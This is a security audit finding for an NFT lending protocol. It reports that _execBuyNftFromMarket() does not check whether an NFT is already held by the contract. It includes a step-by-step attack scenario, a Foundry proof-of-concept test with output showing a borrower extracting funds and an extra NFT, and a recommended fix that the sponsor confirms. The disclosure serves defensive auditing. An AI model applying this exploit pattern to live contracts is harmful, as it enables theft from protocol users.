@@ -1,0 +1,22 @@
+[H-03]_execBuyNftFromMarket()Need to determine if NFT can’t already be in the contract
+Submitted bybin2chen, also found byminhquanym
+Use other Lien’s NFTs for repayment
+Proof of Concept
+_execBuyNftFromMarket()Whether the NFT is in the current contract after the buy, to represent the successful purchase of NFT.
+function_execBuyNftFromMarket(addresscollection,uint256tokenId,uint256amount,uint256useToken,addressmarketplace,bytescalldatatradeData)internal{...if(IERC721(collection).ownerOf(tokenId) !=address(this) ||balanceBefore-address(this).balance!=amount) {revertErrors.InvalidNFTBuy();}}
+But before executing the purchase, it does not determine whether the NFT is already in the contract.
+Since the current protocol does not limit an NFT to only one lien, the_execBuyNftFromMarket()does not actually buy NFT; the funds are used to buy other NFTs, but still meet the verification conditions.
+Example.
+Alice transfers NFT_A to supply Lien[1].Bob performssellNftToMarket(1)and NFT_A is bought by Jack.Jack transfer NFTA and supply Lien[2] (after this NFTA exists in the contract).Bob executesbuyNftFromMarket(1)and spends the same amount corresponding to the purchase of other NFT such as:tradeData = { buy NFT_K }.Step 4 can be passedIERC721(collection).ownerOf(tokenId) ! = address(this) || balanceBefore - address(this).balance ! = amountand Bob gets an additional NFT_K.
+Test code:
+functiontestOneNftTwoLien()external{//0.lender supply lien[0]_approveAndSupply(lender,_tokenId);//1.borrower sell to market_rawSellToMarketplace(borrower,address(dummyMarketplace),0,_sellAmount);//2.jack buy nftaddressjack=address(0x100);vm.startPrank(jack);dummyMarketplace.buyFromMarket(jack,address(dummyNFTs),_tokenId);vm.stopPrank();//3.jack  supply lien[1]_approveAndSupply(jack,_tokenId);//4.borrower buyNftFromMarket , don't need buy dummyNFTs ,  buy other nftOtherDummyERC721otherDummyERC721=newOtherDummyERC721("otherNft","otherNft");otherDummyERC721.mint(address(dummyMarketplace),1);console.log("before borrower balance:",borrower.balance/1ether);console.log("before otherDummyERC721's owner is borrower :",otherDummyERC721.ownerOf(1)==borrower);bytesmemorytradeData=abi.encodeWithSignature("buyFromMarket(address,address,uint256)",borrower,address(otherDummyERC721),//<--------buy other nft1);vm.startPrank(borrower);particleExchange.buyNftFromMarket(_activeLien,0,_tokenId,_sellAmount,0,address(dummyMarketplace),tradeData);vm.stopPrank();//5.show borrower get 10 ether back , and get  other nftconsole.log("after borrower balance:",borrower.balance/1ether);console.log("after otherDummyERC721's owner is borrower :",otherDummyERC721.ownerOf(1)==borrower);}contractOtherDummyERC721isERC721{// solhint-disable-next-line no-empty-blocksconstructor(stringmemoryname,stringmemorysymbol)ERC721(name,symbol) {}functionmint(addressto,uint256tokenId)external{_safeMint(to,tokenId);}}
+$ forge test --match testOneNftTwoLien  -vvv[PASS] testOneNftTwoLien() (gas: 1466296)Logs:before borrower balance: 0before otherDummyERC721's owner is borrower : falseafter borrower balance: 10after otherDummyERC721's owner is borrower : trueTest result: ok. 1 passed; 0 failed; finished in 6.44ms
+Recommended Mitigation Steps
+_execBuyNftFromMarketto determine theownerOf()is not equal to the contract address before buying.
+function_execBuyNftFromMarket(addresscollection,uint256tokenId,uint256amount,uint256useToken,addressmarketplace,bytescalldatatradeData)internal{if(!registeredMarketplaces[marketplace]) {revertErrors.UnregisteredMarketplace();}+require(IERC721(collection).ownerOf(tokenId) !=address(this),"NFT is already in contract ")...
+Assessed type
+Context
+hansfriese (judge) commented:
+PoC -> Marked as primary
+wukong-particle (Particle) confirmed and commented:
+Fixed.
